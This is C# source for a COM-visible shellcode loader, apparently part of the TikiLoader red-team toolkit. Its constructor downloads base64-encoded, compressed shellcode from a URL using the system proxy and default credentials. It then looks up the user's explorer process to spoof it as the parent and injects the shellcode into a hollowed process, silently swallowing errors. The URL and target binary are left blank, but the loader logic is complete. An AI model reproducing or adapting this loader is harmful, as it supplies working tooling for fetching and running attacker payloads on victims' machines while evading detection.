using System;
using System.Net;
using System.Diagnostics;
using System.Runtime.InteropServices;

using TikiLoader;

[ComVisible(true)]
public class TikiSpawn
{
    public TikiSpawn()
    {
        Flame(@"", @"");
    }

    private static byte[] GetShellcode(string url)
    {
        using (var client = new WebClient())
        {
            client.Proxy = WebRequest.GetSystemWebProxy();
            client.Proxy.Credentials = CredentialCache.DefaultCredentials;
            string compressedEncodedShellcode = client.DownloadString(url);
            return Generic.DecompressShellcode(Convert.FromBase64String(compressedEncodedShellcode));
        }
    }

    private static int FindProcessPid(string process)
    {
        var pid = 0;
        var session = Process.GetCurrentProcess().SessionId;
        var processes = Process.GetProcessesByName(process);

        foreach (var proc in processes)
        {
            if (proc.SessionId == session)
            {
                pid = proc.Id;
            }
        }

        return pid;
    }

    private void Flame(string binary, string url)
    {
        var shellcode = GetShellcode(url);
        var ppid = FindProcessPid("explorer");

        if (ppid != 0)
        {
            try
            {
                var hollower = new Hollower();
                hollower.Hollow(binary, shellcode, ppid);
            }
            catch { }
        }
    }
}